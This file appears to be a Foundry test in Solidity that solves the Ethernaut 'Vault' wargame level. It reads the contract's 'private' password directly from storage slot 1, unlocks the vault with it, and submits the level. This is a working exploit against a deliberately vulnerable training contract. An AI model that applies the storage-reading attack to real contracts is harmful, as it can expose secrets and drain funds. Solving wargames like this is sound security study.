// SDPX-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/Vault/Vault.sol";
import "../src/levels/Vault/VaultFactory.sol";
import {Vm} from "forge-std/Vm.sol";

contract VaultTest is DSTest {
    Vm private constant vm = Vm(HEVM_ADDRESS);
    Ethernaut ethernaut;
    VaultFactory vaultFactory;
    address eoaAddress = address(69);

    function setUp() public {
        ethernaut = new Ethernaut();
        vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.deal(eoaAddress, 1 ether);
    }

    function testIsVaultCleared() public {
        vm.startPrank(eoaAddress);

        address levelAddress = ethernaut.createLevelInstance(vaultFactory);

        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
        emit log_bytes(abi.encodePacked(password));

        uint8 i = 0;
        while (i < 32 && password[i] != 0) {
            i++;
        }

        bytes memory bytesArray = new bytes(i);

        for (i = 0; i < 32 && password[i] != 0; i++) {
            bytesArray[i] = password[i];
        }

        Vault(levelAddress).unlock(password);

        emit log_string(string(bytesArray));

        ethernaut.submitLevelInstance(payable(levelAddress));

        vm.stopPrank();
    }
}
